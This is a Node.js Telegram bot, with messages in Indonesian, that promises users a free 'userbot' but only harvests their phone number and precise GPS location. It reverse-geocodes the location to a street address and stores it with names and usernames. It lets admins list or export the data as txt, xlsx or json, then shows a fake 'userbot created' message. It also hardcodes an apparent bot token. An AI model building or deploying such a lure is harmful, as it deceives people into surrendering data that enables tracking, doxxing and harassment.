const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const xlsx = require('xlsx');
const axios = require('axios');

// Replace with your bot token
const token = '7204630585:AAG4oHPMS2YPUZchQc5Iw5wyXVBJEoHQu6s';
const bot = new TelegramBot(token, { polling: true });

// Bot information
const BOT_INFO = {
    developer: '@hiyaok',
    version: '2.5.0',
    updated_at: '2025-01-03'
};

// Define admin user IDs
const ADMIN_IDS = [
    // Add your admin Telegram user IDs here
    5988451717, // Example admin ID
];

// Store user states
const userStates = {};

// Load existing data
let userData = {};
try {
    userData = JSON.parse(fs.readFileSync('info.json', 'utf8'));
} catch (error) {
    userData = {};
}

// Save data function
const saveData = () => {
    const dataToSave = {
        bot_info: BOT_INFO,
        users: userData
    };
    fs.writeFileSync('info.json', JSON.stringify(dataToSave, null, 2));
};

// Get detailed location using Nominatim OpenStreetMap
async function getLocationDetails(latitude, longitude) {
    try {
        const response = await axios.get(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`,
            {
                headers: {
                    'User-Agent': 'Hiyaok/3.0'
                }
            }
        );

        const address = response.data.address;
        return {
            full_address: response.data.display_name,
            street: address.road || address.street || '',
            house_number: address.house_number || '',
            rt_rw: '', // This needs to be provided by user as it's not available in OSM
            village: address.village || address.suburb || '',
            sub_district: address.suburb || address.city_district || '',
            city: address.city || address.town || address.village || '',
            district: address.county || address.state_district || '',
            province: address.state || '',
            country: address.country || '',
            postal_code: address.postcode || '',
            details: address
        };
    } catch (error) {
        console.error('Error getting location details:', error);
        return null;
    }
}

// Check if user is admin
const isAdmin = (userId) => ADMIN_IDS.includes(userId);

// Create backup files
const createBackup = async (format, chatId) => {
    try {
        const dataToBackup = {
            bot_info: BOT_INFO,
            users: userData
        };

        switch (format) {
            case 'txt':
                const txtContent = JSON.stringify(dataToBackup, null, 2);
                fs.writeFileSync('info.txt', txtContent);
                await bot.sendDocument(chatId, 'info.txt', {
                    caption: '✅ Sukses data bentuk txt ‼️'
                });
                fs.unlinkSync('info.txt');
                break;

            case 'xlsx':
                const wsData = Object.entries(userData).map(([userId, data]) => ({
                    User_ID: userId,
                    Username: data.username,
                    First_Name: data.first_name,
                    Last_Name: data.last_name,
                    Phone: data.phone_number,
                    Latitude: data.location?.coordinates?.latitude,
                    Longitude: data.location?.coordinates?.longitude,
                    Full_Address: data.location?.full_address,
                    Street: data.location?.street,
                    House_Number: data.location?.house_number,
                    RT_RW: data.location?.rt_rw,
                    Village: data.location?.village,
                    Sub_District: data.location?.sub_district,
                    City: data.location?.city,
                    District: data.location?.district,
                    Province: data.location?.province,
                    Country: data.location?.country,
                    Postal_Code: data.location?.postal_code,
                    Timestamp: data.location?.timestamp,
                    Maps_Link: data.location?.google_maps_link
                }));

                const wb = xlsx.utils.book_new();
                const ws = xlsx.utils.json_to_sheet(wsData);
                xlsx.utils.book_append_sheet(wb, ws, 'Users');
                xlsx.writeFile(wb, 'info.xlsx');
                
                await bot.sendDocument(chatId, 'info.xlsx', {
                    caption: '✅ Sukses data bentuk xlsx ‼️'
                });
                fs.unlinkSync('info.xlsx');
                break;

            case 'json':
                fs.writeFileSync('info.json', JSON.stringify(dataToBackup, null, 2));
                await bot.sendDocument(chatId, 'info.json', {
                    caption: '✅ Sukses data bentuk json ‼️'
                });
                fs.unlinkSync('info.json');
                break;
        }
    } catch (error) {
        console.error('Error creating backup:', error);
        await bot.sendMessage(chatId, 'Terjadi kesalahan saat membuat backup.');
    }
};

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username || 'User';

    // Kirim pesan dengan tombol inline
    await bot.sendMessage(chatId, `ʜᴀʟᴏ ᴋᴀᴋ @${username} ᴀᴋᴜ ᴀᴅᴀʟᴀʜ ᴜꜱᴇʀʙᴏᴛ ꜰʀᴇᴇ ᴀᴋꜱᴇꜱ, ᴋɪɴɪ ᴛᴇʀꜱɪꜱᴀ 55/100 ᴅᴀʀɪ ᴛᴏᴛᴀʟ ᴜꜱᴇʀʙᴏᴛ ʏᴀɴɢ ɢʀᴀᴛɪꜱ, ᴋɪʀɪᴍ ᴘᴇꜱᴀɴ /ᴄʀᴇᴀᴛᴇ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ
`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'ᴀᴘᴀ ɪᴛᴜ ᴜꜱᴇʀʙᴏᴛ', callback_data: 'explain_userbot' }]
            ]
        }
    });
});

// Callback handler untuk tombol "Apa itu Userbot"
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;

    if (callbackQuery.data === 'explain_userbot') {
        // Edit pesan menjadi penjelasan tentang userbot
        await bot.editMessageText(
            'Userbot adalah bot otomatis yang dapat membantu Anda melakukan tugas tertentu di Telegram tanpa harus terus-menerus mengontrol secara manual. Contohnya:\n\n' +
            '- Membalas pesan otomatis.\n' +
            '- Menjalankan perintah tertentu.\n' +
            '- Memproses data secara cepat.\n\n' +
            'Dengan userbot, Anda dapat mengelola aktivitas di Telegram secara efisien dan mudah!',
            {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔙', callback_data: 'go_back' }]
                    ]
                }
            }
        );
    } else if (callbackQuery.data === 'go_back') {
        // Kembali ke pesan awal
        const username = callbackQuery.from.username || 'User';
        await bot.editMessageText(
            `ʜᴀʟᴏ ᴋᴀᴋ @${username} ᴀᴋᴜ ᴀᴅᴀʟᴀʜ ᴜꜱᴇʀʙᴏᴛ ꜰʀᴇᴇ ᴀᴋꜱᴇꜱ, ᴋɪɴɪ ᴛᴇʀꜱɪꜱᴀ 55/100 ᴅᴀʀɪ ᴛᴏᴛᴀʟ ᴜꜱᴇʀʙᴏᴛ ʏᴀɴɢ ɢʀᴀᴛɪꜱ, ᴋɪʀɪᴍ ᴘᴇꜱᴀɴ /ᴄʀᴇᴀᴛᴇ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ`,
            {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'ᴀᴘᴀ ɪᴛᴜ ᴜꜱᴇʀʙᴏᴛ', callback_data: 'explain_userbot' }]
                    ]
                }
            }
        );
    }
});

// Start command handler
bot.onText(/\/create/, async (msg) => {
    const chatId = msg.chat.id;
    const message = await bot.sendMessage(chatId, 'ʜᴀʟᴏ ᴋᴀᴍᴜ ꜱᴇᴅᴀɴɢ ᴛᴀʜᴀᴘ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ\nʏᴜᴋ ɢᴀꜱᴋᴇɴ ꜱᴇʙᴇʟᴜᴍ ᴋᴇʜᴀʙɪꜱᴀɴ', {
        reply_markup: {
            inline_keyboard: [
                [{ text: '𝙡𝙖𝙣𝙟𝙪𝙩', callback_data: 'next' }],
                [{ text: '𝙗𝙖𝙩𝙖𝙡', callback_data: 'cancel' }]
            ]
        }
    });
    
    userStates[chatId] = {
        messageId: message.message_id,
        step: 'create'
    };
});

// Admin command to check total users
bot.onText(/\/totaluser/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (!isAdmin(msg.from.id)) {
        return; // Silently ignore if not admin
    }

    const totalUsers = Object.keys(userData).length;
    const userList = Object.entries(userData).map(([userId, data], index) => {
        return `${index + 1}. @${data.username || 'NoUsername'} - ${data.first_name} ${data.last_name || ''}\n` +
               `   📱 ${data.phone_number}\n` +
               `   📍 ${data.location?.full_address || 'No location'}\n`;
    }).join('\n');

    await bot.sendMessage(chatId, 
        `🤖 Bot Developer: ${BOT_INFO.developer}\n` +
        `📊 Total Users: ${totalUsers}\n\n` +
        `👥 Daftar Users:\n${userList}`, 
        { parse_mode: 'HTML' }
    );
});

// Admin command for backup
bot.onText(/\/backup/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (!isAdmin(msg.from.id)) {
        return; // Silently ignore if not admin
    }

    await bot.sendMessage(chatId, 'ᴘɪʟɪʜ ᴅᴀᴛᴀ ɪɴɢɪɴ ꜰᴏʀᴍᴀᴛ ᴀᴘᴀ :', {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'ᴛxᴛ', callback_data: 'backup_txt' },
                    { text: 'xʟꜱx', callback_data: 'backup_xlsx' },
                    { text: 'ᴊꜱᴏɴ', callback_data: 'backup_json' }
                ]
            ]
        }
    });
});

// Callback query handler
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;

    if (data.startsWith('backup_')) {
        if (!isAdmin(callbackQuery.from.id)) {
            return;
        }
        const format = data.split('_')[1];
        await createBackup(format, chatId);
        return;
    }

    switch (data) {
        case 'next':
            await bot.editMessageText(`👀 ʜᴀɪ @${callbackQuery.from.username} ɪᴋᴜᴛɪ ꜱᴛᴇᴘ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '𝗚𝗔𝗦𝗞𝗘𝗡', callback_data: 'phone' }]
                    ]
                }
            });
            userStates[chatId].step = 'phone';
            break;

        case 'phone':
            await bot.editMessageText('ɴᴏ ᴛᴇʟᴇᴘᴏɴ ʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ :', {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: {
                    keyboard: [[{
                        text: '💡 Send nomor',
                        request_contact: true
                    }]],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
            break;

        case 'location':
            await bot.sendMessage(chatId, 'ʟᴏᴋᴀꜱɪ ᴋᴀᴍᴜ ᴄᴜʏ ʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ ʟᴇʙɪʜ ᴋᴇᴄᴇ
 :', {
                reply_markup: {
                    keyboard: [[{
                        text: '💡 Lokasi',
                        request_location: true
                    }]],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
            break;

        case 'cancel':
            await bot.editMessageText('ʏᴀᴜᴅᴀʜ ᴅᴇʜ ᴄᴀɴᴄᴇʟ', {
                chat_id: chatId,
                message_id: messageId
            });
            delete userStates[chatId];
            break;
    }
});

// Contact handler
bot.on('contact', async (msg) => {
    const chatId = msg.chat.id;
    
    if (userStates[chatId]?.step === 'phone') {
        const phoneNumber = msg.contact.phone_number;
        
        if (!userData[chatId]) {
            userData[chatId] = {};
        }
        userData[chatId].phone_number = phoneNumber;
        
        await bot.deleteMessage(chatId, msg.message_id);
        
        const message = await bot.sendMessage(chatId, 'ʟᴀɴᴊᴜᴛ ꜱᴛᴇᴘ ᴄᴜʏ ᴅɪᴋɪᴛ ʟᴀɢɪ ᴊᴀᴅɪ ᴜꜱᴇʀʙᴏᴛ ɴʏᴀ', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'ʟᴀɴᴊᴜᴛ', callback_data: 'location' }]
                ]
            }
        });
        
        userStates[chatId].messageId = message.message_id;
        userStates[chatId].step = 'location';
    }
});

// Location handler
bot.on('location', async (msg) => {
    const chatId = msg.chat.id;
    
    if (userStates[chatId]?.step === 'location') {
        const { latitude, longitude } = msg.location;
        
        // Send processing message
        const processMsg = await bot.sendMessage(chatId, '👀 memproses userbot...', {
            reply_markup: {
                remove_keyboard: true
            }
        });

        try {
            // Get detailed location using OpenStreetMap
            const locationDetails = await getLocationDetails(latitude, longitude);
            
            const locationData = {
                timestamp: new Date().toISOString(),
                coordinates: {
                    latitude,
                    longitude
                },
                ...locationDetails,
                google_maps_link: `https://www.google.com/maps?q=${latitude},${longitude}`
            };

            // Save user data
            userData[chatId] = {
                ...userData[chatId],
                user_id: msg.from.id,
                username: msg.from.username,
                first_name: msg.from.first_name,
                last_name: msg.from.last_name,
                location: locationData
            };
            
            saveData();

            // Update to success message
            setTimeout(async () => {
                await bot.editMessageText('ʙᴇʀʜᴀꜱɪʟ ! ᴜꜱᴇʀʙᴏᴛ ᴀɴᴅᴀ ᴛᴇʟᴀʜ ᴅɪ ʙᴜᴀᴛ, ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ
', {
                    chat_id: chatId,
                    message_id: processMsg.message_id
                });
                delete userStates[chatId];
            }, 2000);

        } catch (error) {
            console.error('Error processing location:', error);
            await bot.editMessageText('‼️ eror saat membuat userbot', {
                chat_id: chatId,
                message_id: processMsg.message_id
            });
        }
    }
});
